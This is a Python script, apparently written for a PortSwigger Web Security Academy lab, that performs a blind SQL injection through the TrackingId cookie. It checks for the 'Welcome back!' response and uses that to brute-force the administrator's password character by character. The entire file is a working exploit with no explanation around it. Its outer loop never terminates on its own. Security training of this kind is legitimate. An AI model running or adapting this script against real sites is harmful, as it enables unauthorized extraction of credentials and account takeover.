import requests
import string

password = ""

chars = ''.join(c for c in string.printable if c != "'" and not c.isspace())

params = {
    'category': 'Gifts',
}

position = 1
termination = True


while termination:

    for ch in chars:
        blind_sqli_string_part1 = "aQ1Y8xrajqCuYUvV'+AND+SUBSTRING+((SELECT+" \
            "password+FROM+users+WHERE+Username='administrator')," + \
            str(position) + "," + str(1) + ")+=+'"

        blind_sqli_string_part2 = "'--"

        blind_sqli = blind_sqli_string_part1 + ch + blind_sqli_string_part2

        print(blind_sqli)

        cookies = {
            'TrackingId': blind_sqli,
            'session': 'cziRzm8zqydHrd5meeV2g5bzAVelf3fu',
        }

        response = requests.get(
            'https://0a6700950421e5e98219caf400ce006c.web-security-academy.net/filter',
            params=params,
            cookies=cookies,
        )

        print(response.status_code)

        if "Welcome back!" in response.text:
            print("String found!")
            password = password + ch
            print("password: " + password)
            position = position + 1
            break
    print("password: " + password)
